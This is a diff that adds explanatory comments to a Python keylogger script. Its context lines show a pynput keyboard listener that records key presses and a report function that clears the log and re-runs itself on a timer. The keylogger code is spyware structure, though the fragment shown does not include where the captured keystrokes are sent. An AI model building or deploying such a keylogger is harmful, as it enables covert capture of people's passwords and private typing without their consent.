@@ -47,6 +47,7 @@ def report():
     # We are going to clear the log
     log = ""
     # We are going to call the report function every 2.5 seconds
+    #Although we keep calling the report function, to initially call it we need to call it outside the function
     timer = threading.Timer(5, report)
     timer.start()
 
@@ -54,9 +55,14 @@ def report():
 # This function will start the keylogger
 def start_keylogger():
     keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+    # the above line will assign the keyboard listener to the variable keyboard_listener
     with keyboard_listener:
+        # the above with statement will start the keyboard listener
         report()
+        # the above line will call the report function, could have been called outside the with statement
+        # because the report function is called with a threading timer in the report function
         keyboard_listener.join()
+        #the above line will join the keyboard listener to the main thread and keep the program running
 
 start_keylogger()
 
